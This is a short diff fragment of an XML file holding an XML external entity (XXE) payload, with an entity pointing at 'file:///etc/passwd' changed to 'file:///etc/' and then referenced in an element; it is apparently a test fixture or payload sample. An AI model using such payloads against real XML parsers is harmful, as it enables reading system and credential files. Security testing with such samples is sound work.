@@ -3,6 +3,6 @@
  <channel>
   <!DOCTYPE foo [
     <!ELEMENT foo ANY >
-    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+    <!ENTITY xxe SYSTEM "file:///etc/" >]>
   <foo>&xxe;</foo>
   </channel>
